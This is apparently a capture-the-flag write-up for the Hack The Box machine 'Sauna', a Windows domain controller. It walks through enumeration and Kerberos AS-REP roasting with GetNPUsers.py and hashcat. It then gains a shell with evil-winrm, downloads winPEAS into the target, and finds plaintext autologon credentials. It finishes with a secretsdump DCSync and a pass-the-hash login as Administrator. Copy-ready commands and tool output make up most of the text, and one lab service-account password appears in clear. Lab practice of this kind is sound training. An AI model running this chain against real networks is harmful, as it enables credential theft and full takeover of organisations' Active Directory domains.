# what I learn
- impacket is supercool
  - kerberos roasting = GetNPUsers.py
  - secretsdump.py 
- winPEAS
- Evil-WinRM


# Nmap
```consolse
kali@kali:~$ sudo nmap -p- -sS sauna.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 12:41 EDT
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.038s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
63866/tcp open  unknown
kali@kali:~$ nmap -A sauna.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 14:35 EDT
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.050s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-14 02:40:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/13%Time=5EE51C9A%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h04m32s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-14T02:43:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 321.49 seconds
kali@kali:~$ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL' sauna.htb
[*] exec: nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL' sauna.htb

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 20:55 EDT
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.040s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    administrator@EGOTISTICAL-BANK.LOCAL
```
## -p- -A
```
kali@kali:~$ nmap -p- -A sauna.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 13:05 EDT
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.049s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-15 00:25:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
52647/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/14%Time=5EE65C8A%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m33s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-15T00:28:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1260.37 seconds
```

At this point I know that the target runs this following service:
- samba
- webserver = Microsoft-IIS
- active directory = domain controller
- kerberos

After emurating the website. I couldnt find anything interesting info. I then try to use gobuster with hop to find "hidden page"

```console
kali@kali:~$ gobuster dir -u http://10.10.10.175 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x.php,.txt,.html -t50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.175
[+] Threads:        50
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2020/06/14 13:17:41 Starting gobuster
===============================================================
/Blog.html (Status: 200)
/About.html (Status: 200)
/Contact.html (Status: 200)
/Images (Status: 301)
/Index.html (Status: 200)
/about.html (Status: 200)
/blog.html (Status: 200)
/contact.html (Status: 200)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/single.html (Status: 200)
===============================================================
2020/06/14 13:20:38 Finished
===============================================================
```
Seem like there are nothing more that what I already vissible on the website. 


I tried to user smbclient connect to smb file share with anonymous user (no username + password). No luck


That gave me a finall choice, brutefoce user using **impacket** called, ```GetNPUsers```. using namelist ```/usr/share/SecLists/Usernames/Names/names.txt```
```console
kali@kali:~/impacket/examples$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /usr/share/SecLists/Usernames/Names/names.txt -format hashcat -outputfile /home/kali/HTB/sauna.txt -dc-ip 10.10.10.175 
```

still no luck. At this poin, I know I missed something. I when back to website and I remember that there is a page that contain employer name. 


I created a cuttom namelist for each user with different combanition of username such as, Name Lastname, Name.Lastname, N+Lastname, etc.


This time I use ```kerbrute``` to crack it instead. [Link](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
```console
kali@kali:~/HTB/sauna$ /home/kali/Downloads/kerbrute_linux_amd64 userenum user.txt -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/14/20 - Ronnie Flathers @ropnop

2020/06/14 14:49:28 >  Using KDC(s):
2020/06/14 14:49:28 >   10.10.10.175:88

2020/06/14 14:49:28 >  [+] VALID USERNAME:       XXXXX@EGOTISTICAL-BANK.LOCAL
2020/06/14 14:49:28 >  Done! Tested 17 usernames (1 valid) in 0.084 seconds
```
Bingo I found the username. Now perform kerberos roasting using ```GetNPUsers.py```. tan
```console
kali@kali:~/impacket/examples$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/XXXX -dc-ip sauna.htb
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$user@EGOTISTICAL-BANK.LOCAL:HASHXXX
```
put the hash in a file and use ```hashcat``` to crack it
```console
kali@kali:~/HTB/sauna$ hashcat -m 18200 -a 0 -o crack.txt hash.txt /usr/share/wordlists/rockyou.txt --force
kali@kali:~/HTB/sauna$ cat crack.txt 
$krb5asrep$23$user@EGOTISTICAL-BANK.LOCAL:HASH:PASSWORD
```
I then try to connect to samba, hope to find juicy info there
```console
kali@kali:~/HTB/sauna$ smbclient -L \\sauna.htb -U user
Enter WORKGROUP\user's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```
nope nothing here but it is fine, we already got a user so let just get user flag. now using ```evil-winrm``` to get shell on target machine
```console
kali@kali:~/impacket/examples$ evil-winrm -i 10.10.10.175 -u username -p password
```
ofc the flag is located in Desktop.


I move to \Users to check users on the target machine.
```cmd
*Evil-WinRM* PS C:\Users\XXXX\Documents> cd ..
*Evil-WinRM* PS C:\Users\XXXX> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        6/15/2020   3:56 PM                XXXXX
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```
The compromised user have very stricted permission and cant not do much. My plan was using winPEAS to find out a way which I can user to privesc and get root.


to get winPEAS, I needed to run simplehttpserver using python on kali machine and then using compromised machine to get winPEAS.bat. U can use the following command to dowload file from server.
```cmd
*Evil-WinRM* PS C:\Users> Invoke-WebRequest -Uri "http://ip:port/winPEAS.bat" -OutFile "C:\Users\XXXXX\Downloads\winPEAS.bat"
```
then lauch it!! here is some juicy info
```
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USERS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Files an registry that may contain credentials <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Searching specific files that may contains credentials.
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\USER2
    DefaultPassword    REG_SZ    PASSSWORD
```
Okay let use ```secretsdump.py``` if this user2 have enough privilages, we migh be able to get admin's hash.
```console
kali@kali:~/impacket/examples$ python3 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175 -just-dc-ntlm
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:LMHASH:NTHASH:::
```
Now again user evil-winrm to get shell to the target server. this time we will use **pass the hash** attack to get access to the server

```cmd
kali@kali:~/HTB/sauna$ evil-winrm -h

Evil-WinRM shell v2.3

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message

kali@kali:~/HTB/sauna$ evil-winrm -i 10.10.10.175 -u Administrator -H NTHASH

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:22 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

GLHF